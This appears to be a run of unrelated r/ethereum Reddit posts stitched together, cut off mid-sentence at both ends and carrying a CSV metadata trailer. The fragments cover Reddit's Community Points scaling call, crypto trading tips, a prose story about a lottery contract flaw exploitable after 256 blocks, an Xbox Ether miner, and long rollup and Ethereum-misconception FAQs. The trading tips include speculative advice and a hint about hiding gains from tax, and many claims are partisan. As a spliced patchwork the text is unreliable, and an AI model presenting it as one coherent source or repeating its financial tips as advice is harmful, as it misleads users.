fees that Reddit can pay on their behalf)* Bonus points:   * Users should be able to view their balances & transactions via a blockchain explorer-style interface   * Exiting is fast & simple**Interoperability.** Compatibility with third party apps (wallets/contracts/etc) is necessary.* Scaling solutions should be extensible and allow third parties to build on top of it* APIs should be well documented and stable* Documentation should be clear and complete* Third-party permissionless integrations should be possible & straightforward* Simple is better.

Compatibility with common utilities & toolchains is expected.* Bonus Points: Show us how it works. Do you have an idea for a cool new use case for Community Points? Build it!**Security.** Users have full ownership & control of their points.* Balances and transactions cannot be forged, manipulated, or blocked by Reddit or anyone else* Users should own their points and be able to get on-chain ERC20 tokens without permission from anyone else* Points should be recoverable to on-chain ERC20 tokens even if all third-parties involved go offline* A public, third-party review attesting to the soundness of the design should be available* Bonus points:   * Public, third-party implementation review available or in progress   * Compatibility with HSMs & hardware wallets**Other Considerations*** Minting/distributing tokens is not performed by Reddit directly '[1']* One off point burning, as well as recurring, non-interactive point burning (for subreddit memberships '[2']) should be possible and scalable* Fully open-source solutions are strongly preferred'[1'] In the current implementation, Reddit provides signed data for claims, but does not submit the actual claim transaction for the user (the user does that themselves). Note that smart contracts are considered independent of Reddit provided there is a path to decentralizing control over them.'[2'] Subreddit memberships are currently implemented as a contract acting as an ERC777-style operator that can burn points on a monthly basis, but we are open to changing that implementation.# Community Points OverviewTo help you get started, this is an overview of how [Community Points](https://www.reddit.com/community-points/) work today and some stats on how it's used. We are open to changing most implementation details, provided the basic requirements (above) are met.## Usage stats over the past monthNumber of Community Points holders: '~17,500Number of transfers: '~20,000(reference: reddit.dappradar.com)Number of subreddit memberships: '~800## ContractsCommunity Points is built around 3 contracts:1.

For each round (occurring '~monthly), Reddit submits a proposal for points distribution to a subreddit for approval. Once approved, Reddit issues signed claims for individual users according to the agreed upon points distribution. These claims can be redeemed on-chain. Claims are obtained from Reddit, and submitted to the Distributions contract, which validates the claim and calls the Subreddit Points contract to mint points.https://preview.redd.it/lunpaj18mp551.png?width=1120&format=png&auto=webp&v=enabled&s=139307d7029f77ae6377259027db86bc9f184b32## MembershipsSubreddit memberships are obtained by burning points via the Subscriptions contract. Redditors can optionally configure their membership to be renewable on a monthly basis without additional interaction.

The faster you get use to this the less stressed you will be.5. ALWAYS GO AGAINST THE MARKET, by that I mean panic BUY when everyone is panic selling, take profit when everyone is FOMOing in. 6.

NEVER SHARE YOUR PRIVATE KEY OR INPUT YOUR 12/24 WORD PHRASE IF YOU ARE ASKED BY ANYONE ANYWHERE. 9. If you get an email that causes you fear and a heart attack it's most likely a scam.

If it's too good to be true, it most likely is. 12. Meme coins are a gamble not an investment, always take profit or at least your initial investment.

Yes you can hide it, but remember sooner or later Uncle Sam will get his piece of the pie if not the whole cake. 16. Always have a nice stack on the side for major dip days. Millionaires are made during bear markets. 17. The trend is your friend until the end. 18. Do not leave large funds on an exchange, not your key not your crypto. Go ask those who used mt gox, cryptopia and many other good exchanges.19. Be prepared to be down or even for at least 2 years, yes even if you are up 1000%, bear markets can be brutal.

Their lottery functions were flawed, if you place a bet (systemPlay() function) with betting on number value 0 and then call the won() function after 256+ blocks (after you placed the bet) the returning value will be 0 so you would have bet on 000000 and result would be 000000 and baaam you have the jackpot. The lucky guys first bet was 1 so 000001 and result after 256+ blocks calling won() would be 000000 so he matched 5 correctly which is 20000x and with 0.01ETH bet amount a win of 200ETH. He managed to pull that 2 time and corrected to 0 and for that transaction he had to wait for 256+ blocks, but 5 min before he could call won() the owners withdraw all funds. Moral of the story, that ICO was a scam seeing the owners remains anon all the time AND were able to withdraw all contract funds (doing that after ICO would have been fatal for investors). They thought they are clever, building a honeypot for investors but at the end their poor coded contract caused them damage of 400ETH and no damage to potential investors.

So that is what finally worked.After trying almost ten different apps, exchanges, wallets, etc.... after making dozens of test purchases and attempted transfers... I have finally found the fastest method which works in a total of a few hours. Most of the methods suggested here don't work, they take ~6 days. People are either mislead, they are misunderstanding the question, or they already have an established account so they think it's instant. Coinbase, coinbase pro, crypto.com, these all take 6 days to *transfer crypto to an outside wallet*. Only *in-house trading of various currencies within that very same platform* is instant. You can not actually *withdraw, ie transfer the coin to an outside wallet*, until 6 days. Moonpay didn't work, wyre didn't work, tried so many onramps. Your mileage may vary.

The individual that could potentially hold these unchecked powers is none other than the U.S. Secretary of the Treasury Janet Yellen. The very individual who has be opposed of the crypto market since her confirmation, this is also the same individual who had the brilliant idea to look into bank accounts for possible tax evasion.It doesn't just stop there, this would allow Yellen to employ what is called the ' Bank Secrecy Act' to require certain financial institutions to report information around transactions potentially connected to money laundering, as well as prohibit them from serving account holders with such alleged ties to illicit funds. While the act isn't something new it would go against the essence of what Defi stands for. While on paper this can be limited to those are under suspicion of money laundering and illicit fund activity we all know how quick this can be used to cover more users and account holders. This can be dangerous considering Yellen would have unilateral power over this sector.Crypto means something different to every individual in communities like r/ethereum to some a hedge against the current inflation, a means to increase personal wealth, monetary freedom and anonymity, whatever the reason is we are all in this together.This post is not to spread FUD or to get people to sell in order to give me a better buying opportunity.

I have a background in software engineering and masters in statistics and used that knowledge in the fun world of open-source crypto and Etherum :P Unfortunately, it only gets around 3 MH/s on my Xbox Series S right now. BUT with the help of the open-source community, I think it is possible to reach around 15 MH/s on the series S (possibly higher) and 30 MH/s on the series X.  No idea on the Xbox One.Also as of right now, I haven't made it available to mine without building from source (AKA doing super nerdy software stuff to run the miner). If people help me increase the MH/s to make this really usable as a miner, I'll create a downloadable, easy to install Xbox miner. I made this as a Proof of Concept to get around all the hardware (Xbox, PS5 etc.) that is not user-configurable and is actively anti-crypto. Since the POC is done, I don't have major plans on making the miner better and easy to use, but I did put my ether wallet up on the github page. If I get donations I'll spend some time making it better. I've already put '~200 hours in this so I'm kinda done ATM so I would need some motivation to keep working on it lol. However, I will merge good PRs etc from open source community regardless <3If you like this idea, please please give it a star on Github so we can increase visibility.

For the first time, I was able to show people in the real world a working dapp that was *fun*, to the point where they downloaded MetaMask and put some ether on it.

Again, Ethereum users now have access to a new, useful economic tool that didn't exist before. It represents a huge step forward in solving the funding problem of open source development.- Toastycoin (full disclosure: my project) used novel game theory to outsource arbitrary tasks to reliable strangers while dissuading scammers, all automatically. The Ethereum ecosystem now has access to a generalized, unscammable task outsourcing mechanism, which has been proven to work and is unhindered by licensing restrictions.How many 'game coin' ICOs have we seen? And yet it was CryptoKitties alone that was so fun it clogged Ethereum *for a week*. How many ICOs talk about service marketplaces? And yet gitcoin is quietly listing [25 open tasks](https://gitcoin.co/explorer?q=) just waiting for developers to claim them (edit: and over 100 finished tasks!), and Toastycoin generalizes the idea further to apply to any small task one human could perform for another.Even better: none of these products require the user to go buy some shit coin on some random exchange they've never heard of. They just need ether and MetaMask, and they've got virtual kitties. Boom.ICOs are not effective vehicles for innovation, and don't deserve the focus we've been giving them.

Here, I'll address some of these myths and misconceptions to the best of my knowledge. Feel free to ask more questions, I'll edit them in. Also, please correct me if I get something wrong.I believe a lot of misconceptions are because people are stuck with the old monolithic blockchain ways where it is assumed that there's only one way to do things, and that is that one blockchain will do everything. So, let's begin with that, and also, thanks to r/ethfinance users for contributing these misconceptions.**Addendum**: Now that this post is pinned, I'm adding a couple of links so you can learn what rollups are. This is how Ethereum & the wider blockchain industry will scale.[An Incomplete Guide to Rollups (vitalik.ca)](https://vitalik.ca/general/2021/01/05/rollup.html)[https://www.youtube.com/watch?v=7pWxCklcNsU](https://www.youtube.com/watch?v=7pWxCklcNsU&t=1s)Updated on 14th October 2021. # Rollups are a temporary band aid fix - X, Y, Z blockchain can do it on L1 so they don't need rollups(by u/hehechibby, u/ec265)Rollups are the present and future of the blockchain industry.But first, a brief perspective shift is required to understand why rollups are essential. Until now, blockchains have had to do it all - execution, consensus/security and data availability. This has led to significant bottlenecks and inefficiencies, reflected in the blockchain trilemma. Rollups are blockchains that are laser focused on one thing, and one thing exclusively: executing transactions as fast as possible, while 'outsourcing' the hard work of security and data availability to a different L1 chain that is better at it. It's simple division of labour or specialization in action. Just like it led exponential growth in the industrial revolution, so will it lead exponential increase in scalability for the blockchain industry.Now, X, Y, Z blockchain may have compromised significant amounts of decentralization and security to get high scalability, and Ethereum and Bitcoin may have compromised scalability to get high security and decentralization. Rollups are simply constructions that can get the best of all worlds - with high scalability, security, *and* decentralization.The important point is that it doesn't matter if it's an L1 or a rollup - to the user they are just interacting with an execution layer. **Execution layers - L1s and rollups - should be directly compared with each other.** Solana and Avalanche are not competing with Ethereum - they are competing with Arbitrum One and StarkNet. '[Unless they pivot to a rollup-centric roadmap focusing on security and data availability, rather than execution - like Ethereum and Tezos have.']**Tl;dr: Whatever any L1 execution layer can do, a rollup can do it better.**# X, Y, Z blockchain is still faster than rollups[No.](https://www.reddit.com/r/ethfinance/comments/pk57n7/why_rollups_data_shards_are_the_only_sustainable/) Once again, whatever any L1 can do, a rollup can do it better long term. I'll point out that there's a wide-open design space with rollups, and some rollups will opt to have conservative rate limits - especially optimistic rollups. But with zkRs, they don't *have* to - they can push past the limits of L1s as described in the article linked above.# Lack of composability is bad(by u/Whovillage)This is a common argument about rollups but it actually makes very little sense. As mentioned twice already, whatever any L1 can do, a rollup can do it better. I don't see anyone complaining about lack of composability between L1s?A rollup remains fully composable, even if it's settled across multiple data shards or external data availability sources.Like L1s are not composable with each other, so are rollups not composable with each other. But there are many interoperability solutions live like Hop, Connext, cBridge and Biconomy, and many more in the works. Indeed, there's amazing innovations [like dAMM that lets multiple zkRollups share liquidity](https://medium.com/starkware/damm-decentralized-amm-59b329fb4cc3)! In addition, eventually we can have internally sharded zk rollups which retain full synchronous composability - a feat nigh impossible on L1s. **Tl;dr: Rollup composability is superior to L1s.**# Fragmentation of liquidity is bad(by u/Beef_Lamborghinion)See above, all of the same applies. Rollups may not share liquidity, but neither do L1s. Except, unlike L1s, they actually can with innovations like dAMM!**Tl;dr: Rollup liquidity fragmentation is less than L1 fragmentation.**# Rollups are centralized(by u/Whovillage)All transaction data (in compressed form) and proofs are published on L1, which enable exiting a rollup directly from L1 even if the rollup itself is compromised. So, security and decentralization of rollups = security and decentralization of L1. Now, it's certainly true that rollups [may have centralized controls in the early days](https://www.reddit.com/r/ethfinance/comments/nl9cum/early_rollup_training_wheels/), but most if not all rollup projects are committed to progressive decentralization. The final form of rollups: zk rollups with decentralized sequencers, decentralized provers, decentralized L1 smart contracts and light unassisted exits - **you have security and decentralization that's practically identical to the most secure and decentralized security layer (currently Ethereum), except with the massive scalability**.# Casual users will never be able to execute the CEX - Ethereum mainnet - rollup journey / it's too expensive(by u/Whovillage, u/stevieraykatz)Top CEXs like OKEx, Huobi and Coinbase have committed to support withdrawals directly to (and deposits from) Arbitrum One and other rollups with very low fees. Bitfinex already supports withdrawals to Hermez.Meanwhile, going through Ethereum is not the only way into rollups. cBridge, for example, lets you enter Arbitrum One through Optimism, Polygon PoS, Binance Smart Chain, xDai, Avalanche or Fantom. So, there are plenty of options already, and there'll be many more over time as CEXs and fiat ramps integrate, and liquidity builds up for these various solutions. Argent is releasing with direct fiat on-ramps to zkSync and other rollups soon. With account abstraction, innovative fee models, and meta-transactions - the user experience can actually be better. We can already see this on dYdX - all gas is abstracted from the user. All the user sees is instant transactions without ever having to worry about gas - a UX better than any L1. **Tl;dr: The UX is better than any L1.** # It takes too long to withdraw from rollupsThis is true for optimistic rollups - take 7 days to withdraw from rollup to L1 using the default bridge. However, as mentioned above, there are multiple options available that let you make a fast withdrawal for fungible assets. Of course, zkRollups don't have this limitation. For NFTs, zkRs are thus a preferred solution. # Rollups will be obsolete after 'Eth 2.0'Firstly, ['Eth2' is deprecated nomenclature](https://notes.ethereum.org/@timbeiko/great-renaming). The two major upgrades coming to Ethereum next are The Merge which merges the consensus layer (previously eth2) with the execution layer (previously eth1) - so we're all one Ethereum again! The next major upgrade after that is data sharding on the consensus layer side. Data sharding is actually focused on accelerating rollups. So, Ethereum L1 scalability will be limited for the foreseeable future, while rollups will scale through the roof!**Tl;dr: Ethereum's roadmap is rollup-centric and designed to accelerate and empower rollups.**# Rollups are still too expensiveThis is true, in the short term. Optimistic rollups like Arbitrum One and Optimistic Ethereum are reducing fees by 90%-95% currently, which while a huge improvement over Ethereum is still too expensive. With some optimizations like signature aggregation, better batching and calldata compression, this can be reduced to 99%. Indeed, zkRollups are already seeing 99% reductions getting fees down to the $0.10-$1 range even when L1 fees are high. dYdX is already doing transaction fees in the '~$0.10 for complex DeFi derivative trades - although this is abstracted away from the end users to be gas-free. But it doesn't stop here! When Ethereum releases data shards, rollup costs will absolutely plummet, with over a magnitude greater capacity unlocked overnight, scaling up to several orders of magnitude long term.You can get a preview of that with validiums like Immutable X, where it costs less than a cent to mint an NFT. Indeed, it's so cheap that Immutable X is subsidizing it, so it currently costs $0.00 to mint an NFT with your Ethereum wallet! [Try it out for yourself on SwiftMint](https://swiftmint.io/). I'll note that validiums are not as secure as rollups, but they are more secure than sidechains and other L1s. Volitions further extend this by giving users the choice between rollup and validium - best of all worlds!**Tl;dr: In the long term, rollups + data shards will offer the greatest scale and lowest fees possible for given demand.**# Rollup finality is slowRollup sequencers give you 'soft confirmations' nearly instantly - for me this is '~0.3 seconds on average for a Uniswap trade on Arbitrum or Optimism. For most people, this soft confirmation is fine. But it's true that L1 finality is often delayed, especially in the case of zkRs. StarkNet has a great solution [with checkpoints achieving effective finality](https://ethresear.ch/t/checkpoints-for-faster-finality-in-starknet/9633) on the rollup side very quickly, at which point the finality is as fast as the L1 can finalize. As zk tech improves, Ethereum implements single-slot finality and data shards are staggered, we will see finality drop to a few seconds. You can also have a consensus mechanism on a rollup that finalizes fast - just like any L1 would - so you get the same experience, but additional security. But this gives up efficiencies gained from being a rollup. All that said, there may be some niche usecases where settling directly on L1 still makes sense without bolstering security - but this is a very small niche.# Rollups are an Ethereum thing and bound by EVM and SolidityRollups are definitely not just an Ethereum thing. Indeed, [Tezos is embracing](https://www.youtube.com/watch?v=oqBSs0DSuzQ) a rollup-centric roadmap. Arthur Breitman, founder of Tezos, actually makes one of the best arguments for why rollups are the ultimate scalability solution, in tandem with data shards. [NEAR is also designing for sharded data availability](https://twitter.com/ilblackdragon/status/1437323779420696578). Celestia is building a security & DA layer exclusively for rollups. Further, rollups have a wide open design space. They can experiment with VMs, fee models, coordination mechanisms, governance etc. Indeed, the room for innovation is much wider than L1s - given they always have a fallback on the most secure L1. Want a quantum-resistant VM? Use StarkNet. Like your UTXOs? Use Fuel V2. Like LLVM and Rust? Use zkSync 2.0. Just want a chain optimized for one specific application? Sure, use Immutable X for NFTs. Want a fully private chain: use Aztec. WASM? Arbitrum. Any VM, any programming language, any data model - a rollup can do it all. Indeed, it can innovate beyond any L1 with clever fee & tokenomics models (see: Immutable X's IMX token), governance structures, etc. **Tl;dr: Rollups have a wide-open design space, and anything any L1 can do, so can rollups, and then some.**# Why is Ethereum special, if you can deploy rollups elsewhere?Rollups will leverage whatever is the most secure and decentralized L1 with the highest data availability that can support it.It's clear Ethereum is orders of magnitude more secure and decentralized than any smart contract platform. Realistically, Bitcoin is the only other chain that's comparable, but of course, they lack the ability to host rollups.Ethereum doesn't currently have the highest data availability, but it will, with data sharding. Meanwhile, we have validiums offering ample data availability with security that's still superior to other L1s. Data sharding inverts the trilemma - the more decentralized your network is, the more data shards you can deploy, and the more scalable your rollups will be. This is how rollups that deploy on Ethereum will scale to millions of TPS over the years, [speculatively up to 15 million TPS by 2030](https://www.reddit.com/r/ethfinance/comments/ojafms/conjecture_how_far_can_rollups_data_shards_scale/). The only area where Ethereum can be improved is the execution layer - to make it more friendly for verifying zk-SN(T)ARKs. I'm sure it will, once The Merge, data shards and statelessness are done.It's clear, then, that Ethereum is uniquely positioned to be the best host for rollups. But this is not to say that there can't be other contenders. If Ethereum's data shards are saturated, we'll see data availability chains like Celestia or Avail potentially taking up the slack. Other L1s who are embracing a rollup-centric model, like Tezos, may also benefit if there's an overflow of demand from Ethereum-based rollups. And of course, the elephant in the room is an unexpected new competitor, though realistically, the only real competitor is if Bitcoin somehow adds the functionality to verify zk-SNARKs and implements data sharding.For the rollups, it doesn't really matter. They'll just leverage whatever L1 offers them the best security, decentralization, network effect and data availability.**Tl;dr: Ethereum is uniquely positioned to offer the highest security, decentralization, and data availability - making it the defacto standard host for rollups.**# Rollups are stealing traffic from EthereumEthereum execution is fully saturated, and has had full blocks for years now. All activity on rollups is net additive. Now, some may argue sharding would have expanded Ethereum's capacity - but rollups + data shards in tandem increase the overall capacity of the Ethereum ecosystem by several orders of magnitude more than the previous sharding solution.# Rollups are too complicated, no one will understand itMight I just point out I'm writing this on the day that Arbitrum One has proven to be the fastest growing smart contract platform in history? In reality, the UX for using a rollup is identical to that of using an L1, as covered before. Users need not care about the underlying architecture - to them it's just another smart contract platform. Do YouTube users care about what programming language it was written in, what OS the servers run on, what hardware the servers implement, what internet connection they use etc.? Of course not. Indeed, [I expect things will improve significantly with smart contract wallets and centralized frontends](https://polynya.medium.com/a-vision-of-ethereum-2025-bb92a0d4dc4f).# When rollups get big enough they will just abandon the base chain and create their own blockchain(by u/Whovillage)Technically, this is possible. However, what makes a rollup special is that it's backed by the most secure and decentralized L1. This is the hardest bit, evidently so as only Bitcoin and Ethereum have managed to achieve it. Arbitrum One has already demonstrated that there's exponentially more demand for a chain backed by Ethereum's security than a more centralized consensus mechanism. On a related note, as alluded to earlier, if there's a competitor that offers better security and data availability than Ethereum, then rollups will be well incentivized to migrate. Which is fine, and will keep Ethereum core researchers and developers honest.# There are no rollup tokens, so people won't be invested in the ecosystemsThis is not quite true. While there are many rollup projects in their early stage and do not yet have a token, I expect most rollups to eventually release a token. Many rollup projects do have tokens, and are using them in innovative ways - like Immutable X. Just another advantage for rollups over L1s - you can have unique and clever token and fee models.# It's too expensive to compute a zero-knowledge proofTrue, but by amortizing this over many transactions, the costs become negligible relative to gas paid for transaction calldata. Of course, we're still in the early days of zero-knowledge tech, and we'll see costs and time for computing zk proofs plummet over time. Software optimizations, GPU/FPGAs/ASICs, Moore's Law, and growing adoption with more transactions means things will only get better for zkRollups, which have already proved to be sustainable.# Can NFTs transfer easily between L1 and rollups and between rollups?(by u/Datacruncha)This is a great question that I had overlooked. While there are multiple bridges for fungible tokens, as mentioned above, NFTs are more complicated because you can't have liquidity bridges. Currently, yes, you can transfer NFTs between L1s and rollups, but the solutions are definitely early workarounds. For example, on zkSync 1.x, you can mint an NFT there, and when you withdraw to L1, it's simply burned on zkSync 1.x and minted as an ERC-721 on L1. Cross-rollup is definitely an unresolved problem. Fortunately, this is being actively researched, and there's a lot of discussion on a [recent wrapped NFTs proposal by Vitalik](https://ethresear.ch/t/cross-rollup-nft-wrapper-and-migration-ideas/10507) to make NFTs easily transferable cross rollups. Jordi Baylina from Polygon Hermez [further expands upon it](https://ethresear.ch/t/cross-rollup-nft-wrapper-and-migration-ideas/10507/28) but really there are many insightful comments in that thread (and some low-quality trolling too!).# You're talking about the future, execution risks remainThis is absolutely true. Rollups are nascent technology, and [it'll take a couple of years to mature](https://www.reddit.com/r/ethfinance/comments/paipgj/why_the_transition_to_rollupcentric_ethereum_is_a/) and live up to their potential.

This change is by far the biggest and most fundamental change that the Ethereum roadmap has ever seen. Ethereum L1's role has evolved a lot and it now aims at becoming a settlement layer for rollups. Ethereum is no longer focused on being a smart contract platform, but rather, a platform to build smart contract platforms on top of. This starts with The Merge, which will merge the execution layer (previously eth1) and consensus layer (previously eth2), and continue with the release of data shards. The entire roadmap now entirely revolves around the idea that rollups are THE way through which Ethereum will be used by billions.It's not true anymore that *'Ethereum 2.0 will soon bring fees down'*, rollups will! But this is unfortunately still the most common misconception about Ethereum's road to scalability. The reason why is rather obvious: communication around this change has been lacking.It may be time for this information to be spread more widely, for example through visible and easy to understand articles on [Ethereum.org](https://Ethereum.org), or pinned posts on r/ethereum and r/ethfinance.We finally have a solid plan to solve one of the most important limitations of blockchains, maybe we should start talking about it a bit more.",False,The blockchain communities never really received the memo: Ethereum is becoming a rollup centric platform,u/[deleted],17,1100,0.97,https://www.reddit.com/r/ethereum/comments/pbbta8/the_blockchain_communities_never_really_received/,[]

Ethereum is the network, Ether is the currency. And there is no 'I' anywhere in the name.2. [Fees are high](https://cryptofees.info/) because that's how much the market values Ethereum's limited blockspace. It's purely supply and demand.    * Fees scale with [how much computation is being executed](https://docs.ethhub.io/using-ethereum/transactions/), not how much money is being handled. It costs $5 on average to send any amount of Ether, whether it's $1's worth or $1 million's. It costs much more to do swaps and mint NFTs and such because those operations require more computation.    * There is no way for anyone to artificially keep fees high unless they're willing to [literally burn millions of dollars per day for no reason](https://watchtheburn.com/).3. Ethereum's blockspace is limited because letting people run nodes themselves on average consumer hardware is important for decentralization.    * Decentralization is a spectrum and has many meanings from protocol specification, protocol implementation, node distribution, coin distribution, censorship resistance, permissionlessness, etc.    * Pointing at one aspect to scream 'centralized' isn't clever nor helpful. Chances are the aspect you point out is known and is an active area of research with a concrete plan on [the roadmap](https://i.imgur.com/vXMaIyZ.png) to address it and increase decentralization some more.    * No blockchain is ever fully decentralized, especially not from the start ‚Äì and Ethereum's end goal is to be able to run without a hiccup for *decades* if not *centuries*. At 6.5 years old, it's still very young.    * If you care about decentralization, invest in and contribute to projects like Ethereum who view it as a goal, not a crutch that 'nobody cares about it that much anyway, let's just [increase the gas limit](https://github.com/binance-chain/bsc/issues/553) to have low fees asap'4. There is a [vast difference](https://ethereum.org/en/developers/docs/nodes-and-clients/#node-types) between an 'archive node' (several TBs) and a 'full node' (hundreds of GBs)    * Running an archive node is not necessary to sync from genesis and verify blocks and transactions.    * A full node has all the information enough to generate an archive node.    * There are plans on [the roadmap](https://i.imgur.com/vXMaIyZ.png) to reduce the storage/bandwidth/RAM requirements of nodes even more, to a point where a smartphone will be able to independently verify and propagate new blocks. 5. There is no 'when eth2 rolls out' or 'when devs release eth2' or god forbid 'when ethereum is upgraded to 2.0'. What there is instead is a roadmap consisting of a series of upgrades aiming to help rollups ‚Äì *not the base layer* ‚Äì scale to hundreds of thousands of TPS.    * Depending on context, Eth1 is usually synonymous with 'execution layer' and Eth2 usually means 'consensus layers' ([helpful illustration](https://i.imgur.com/AHHcUgm.png)) otherwise 'eth2' is an umbrella term for the set of upgrades over a long period of time, but the fact remains that there is no specific instant in time where 'eth1 turns into eth2'.    * Similarly, there is no 'eth2' coin. ETH is ETH, you don't have to do anything, the coins you hold today will be the same after the switch to proof of stake.6. Unlocking staked Ether [will not cause a mass sell-off event](https://twitter.com/domothy/status/1467387422765953029). There is a limited withdrawing queue, it's not gonna happen all at once. And there are many more reasons for more people to start staking Ether than there are for the current stakers to exit en masse.    * Also, unlocking staked Ether will not be possible directly after the merge. Withdrawals will be enable in the first fork that follows the merge ~6 months later.7. There are plenty of options to avoid high gas fees, it's perfectly fine to use a sidechain to do your DeFi stuff for now. I use sidechains myself too. Just don't pretend these sidechains will replace Ethereum in any significant way as that's not even what they're trying to do.8. Switching to Proof of Stake [will not lower Layer 1 gas fees significantly](https://willthemergelowergasprices.org/). Anyone saying otherwise is either misinformed or trying to mislead you into false expectations to bank on the inevitable mass disappointment following the merge.    * It's still a monumental upgrade that will render possible much-needed upgrades like light clients, statelessness, and sharding, etc. that would otherwise be impossible or impractical to implement on the current proof of work chain.    * It's basically a way to 'start from scratch' while keeping the same coin, same users, same dapps, same network effects.    * PoS has been on the roadmap [since day 1](https://blog.ethereum.org/2015/03/03/ethereum-launch-process/). Yes, estimates of PoS dates have been wrong before. However right now it's all hands on deck on the merge, the spec is done, the beacon chain is running, there is a [merge testnet running](https://blog.ethereum.org/2021/12/20/kintsugi-merge-testnet/), it's happening.9. Sharding will not lower Layer 1 gas fees significantly either. Sharding is all about *data*, execution on Layer 1 will still be limited and expensive. What data sharding will do is help rollups (Layer 2) scale by several orders of magnitude.10. [Rollups](https://mirror.xyz/ethmaxitard.eth/iyCAlOexgQKOvoSAAk4utYGEdnESOKb5HstM2_LaqL4) are [already live today](https://l2beat.com/) and they will only [get cheaper](https://l2fees.info/) as more people use them.11. [Data sharding + rollups is the only sustainable way](https://www.reddit.com/r/ethfinance/comments/pk57n7/why_rollups_data_shards_are_the_only_sustainable/) to scale a blockchain globally without compromising decentralization.    * 'Sustainable' as in the overall security model doesn't rely on hoping that the coin's price will pump forever to outpace the dilution from the blockchain issuing way more new coins than they collect in fees. Something that all major blockchains (including Ethereum most days, and even Bitcoin) are currently doing.    * 'Without compromising decentralization' as in more decentralization = more data for rollups = more scaling (lower individual fees on L2). Decentralization becomes an integral part of the scaling equation rather than a crutch.    * [The rollup-centric roadmap](https://ethereum-magicians.org/t/a-rollup-centric-ethereum-roadmap/4698) is all about admitting that no single blockchain can do it all by itself and can't compete with what rollups can do. In other words, 'Ethereum maximalism' amounts to helping independent teams develop rollups, innovate and compete with each other on top of Ethereum's secure, decentralized, and open platform.    * The true competition of sidechains is rollups, not Ethereum itself.     * All the criticisms of a multi-rollup world apply to the current multi-chain world model as well. Except they apply way more to the multi-chain world and can be overcome way more easily in a multi-rollup world.    * A rollup can settle on any L1, sure, but it's gonna gravitate towards the most secure, most decentralized and most credibly neutral settlement layer with the best data availability. Right now only Bitcoin and Ethereum fit those criteria (other L1s optimize for fast execution, not secure data availability) and Bitcoin would need a hard fork to implement rollup-friendly functions, so that only leaves Ethereum as the poised ['AWS for blockchain'](https://twitter.com/domothy/status/1465905887541972996).12. Ether isn't meant to be a day-to-day currency that will replace fiat. The use-case of Ether isn't to pay for bread and milk, it's to pay for gas fees and secure the network. All the other use-cases derive from Ether's scarcity, but they're not strictly necessary.    * Having Ether be an appreciating asset is good for the overall long-term health of the network by providing it with more [economic security, its holders more economic bandwidth](https://i.imgur.com/AErfdod.png), and its users more reasons to hold/stake. The incoming deflation is good.    * However, the supply is not gonna be deflationary forever. The market dictates how much the blockspace is worth (so how much gets burned) and it also dictates how much the staking APR should be (so how much gets printed) so these two opposing forces will meet in the middle at some point. It's all about [them feedback loops](https://i.imgur.com/3bPV35a.png).13. The security model trumps the economic model. The core idea behind the economic model is: '[Minimum viable issuance to secure the network](https://www.reddit.com/r/ethfinance/comments/izhkvk/minimum_viable_issuance_why_ethereums_lack_of_a/)'. It was designed from the start to be [disinflationary](https://blog.ethereum.org/2014/04/10/the-issuance-model-in-ethereum/) (as in, inflation % terms goes down over time) with even the idea of fee burning being mentioned in [early](https://blog.ethereum.org/2016/07/27/inflation-transaction-fees-cryptocurrency-monetary-policy/) publications and [FAQ](https://github.com/ethereum/wiki/wiki/Proof-of-Stake-FAQ/ba766606790d80422b23650d3326e2d963bdfa87)14. It's okay to change or tweak things when new research indicates there's a problem with long-term sustainability or security of the current model. These changes don't happen 'on a whim of a few people', there's a lot of consideration that go into them.    * And remember, changes happen in a highly adversarial context. If there's *any* possibility of an upgrade causing security problems or being exploited in any way for profit, then it *will* happen. Changes don't just happen for fun 'just because', they happen when their benefits outweigh the inherent risks of potentially adding more complexity.15. The Ethereum Foundation is more of a [coordinator than a dictator](https://ethereum.foundation/philosophy/). It's much more of a community-focused bottom-up approach than the top-down structure people think.    * Everything happens extremely transparently on open forums that no one reads and [public livestream calls](https://www.youtube.com/c/EthereumFoundation/videos) that no one listens to. But everyone who wants to participate is welcome, it's all out in the open.    * The Ethereum Foundation doesn't code any of the actual software, client teams do. There are 5 major execution clients and 4 major consensus clients, developed by independent teams, to implement the protocol specification. This multi-client approach may be responsible for development delays, but it comes with [security benefits](https://www.reddit.com/r/ethereum/comments/mreacw/psa_the_importance_of_multiclient_and_why_the/)    * [Anyone can propose an Ethereum Improvement Proposal](https://ethereum.org/en/eips/). You just have to convince others it's a good idea to implement it (most EIPs don't get implemented and fall into obscurity) and the clients could just refuse to code it in if it's a very bad idea. The more time passes, the harder it becomes to push changes to the Ethereum protocol and everything converges to the status quo. (This doesn't close the door to further innovation however, as it's still an open platform on which anyone can build)    * Vitalik regularly gets his proposals blocked by client teams, other researchers, or the community in general. At most, he's a knowledgeable influence because he knows the tech and cryptography in depth and has been there from the beginning. It's silly to worship him, and it's silly to treat him as Ethereum's Zucc-like CEO. He's 'just some guy'.16. The '[DAO hard fork](https://eips.ethereum.org/EIPS/eip-779)' wasn't a roll-back. Not a single transaction was reverted, no one lost any funds other than the exploiter who could have otherwise gotten away with [15% of the total supply at the time](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). It wasn't a bailout of Vitalik and his pals, it was a bailout of a huge chunk of the community from an event that could have killed the whole thing in its infancy.     * In the end it's all social consensus, and the consensus from miners, users, developers was strong. Even 'code is law' is social consensus that [can get reverted in case of major bugs](https://en.bitcoin.it/wiki/Value_overflow_incident). It's all about what the community deems [legitimate](https://vitalik.ca/general/2021/03/23/legitimacy.html).    * *edit: see comments for more nuance on this point*17. As far as the [initial distribution](https://i.imgur.com/k3GB8Lh.png) goes, Ethereum's ICO is among [the best of those who had an ICO](https://i.imgur.com/fmW3ytf.png), and as far as the current distribution goes (after 6 years of proof of work and market movements), it's [on par with Bitcoin's](https://medium.com/@adamscochran/the-10k-audit-42c100dd32bb). 60m of the 72m 'pre-mined' coins went to a permissionless no-KYC sale, and [all the genesis transactions are included in Block #0](https://etherscan.io/txs?block=0) so you can check yourself that there's no hidden coins. Just like Bitcoin, early investors took on big risks and got big rewards. No surprises here. Any concerns of the ICO being a scam or rugpull should have vanished some time in 2015, yet here we are still talking about it for some reason.    * And if coin distribution is a concern to you because proof of stake, then you should be glad the DAO hack didn't end up with a single person owning 15% of the supply...    * *edit: see comments for more nuance on this point too lol*18. There is no 'technical debt' preventing Ethereum from scaling.19. EIP-1559 was [not meant to lower gas fees](https://web.archive.org/web/20210205013340/https://willeip1559lowergasprices.org/) and no credible person ever promised it was a scaling solution.    * It has [many benefits](https://domothy.com/eip1559/) beyond coin burning. The deflation is a nice side effect, and it's certainly not a gimmick meant to pump the price.20. Proof of Work is really just Proof of 